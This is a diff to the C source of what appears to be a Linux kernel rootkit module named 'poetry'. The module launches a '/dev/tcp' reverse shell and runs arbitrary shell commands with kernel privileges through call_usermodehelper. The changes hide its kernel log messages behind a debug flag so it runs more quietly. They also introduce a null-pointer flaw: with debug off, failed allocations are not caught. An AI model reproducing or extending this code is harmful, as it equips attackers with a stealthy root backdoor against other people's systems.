@@ -3,6 +3,7 @@
 #define SHELL "/bin/bash"
 #define EXEC_P1 "bash -i >& /dev/tcp/"
 #define EXEC_P2 "0>&1"
+extern int debug;
 
 struct shell_params {
 	struct work_struct work;
@@ -27,10 +28,15 @@ void execute_reverse_shell(struct work_struct *work){
     strcat(exec, params->target_port);
 	strcat(exec, " ");
     strcat(exec, EXEC_P2);
-    printk(KERN_INFO "poetry: Starting reverse shell %s\n", exec);
+
+    if (debug == 1)
+    {
+        printk(KERN_INFO "poetry: Starting reverse shell %s\n", exec);
+    }
+    
 
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if(err<0){
+    if(err<0 && debug == 1){
         printk(KERN_INFO "poetry: Error executing usermodehelper.\n");
     }
     kfree(exec);
@@ -43,7 +49,7 @@ void execute_reverse_shell(struct work_struct *work){
 int start_reverse_shell(char* ip, const char* port){
     int err;
     struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
-    if(!params){
+    if(!params && debug == 1){
         printk(KERN_INFO "poetry: Error allocating memory\n");
         return 1;
     }
@@ -52,7 +58,7 @@ int start_reverse_shell(char* ip, const char* port){
     INIT_WORK(&params->work, &execute_reverse_shell);
 
     err = schedule_work(&params->work);
-    if(err<0){
+    if(err<0 && debug == 1){
         printk(KERN_INFO "poetry: Error scheduling work of starting shell\n");
     }
     return err;
@@ -66,10 +72,15 @@ void execute_command(struct work_struct *work)
     char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
     char *argv[] = {SHELL, "-c", exec, NULL};
     strcat(exec, params->command);
-    printk(KERN_INFO "poetry: executing command %s\n", exec);
+
+    if (debug == 1)
+    {
+        printk(KERN_INFO "poetry: executing command %s\n", exec);
+    }
+    
 
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if(err<0){
+    if(err<0 && debug == 1){
         printk(KERN_INFO "poetry: Error executing usermodehelper.\n");
     }
     kfree(exec);
@@ -81,7 +92,7 @@ int start_command(char* command)
 {
     int err;
     struct command_params *params = kmalloc(sizeof(struct command_params), GFP_KERNEL);
-    if(!params){
+    if(!params && debug == 1){
         printk(KERN_INFO "poetry: Error allocating memory\n");
         return 1;
     }
@@ -89,7 +100,7 @@ int start_command(char* command)
     INIT_WORK(&params->work, &execute_command);
 
     err = schedule_work(&params->work);
-    if(err<0){
+    if(err<0 && debug == 1){
         printk(KERN_INFO "poetry: Error scheduling work of executing command\n");
     }
     return err;
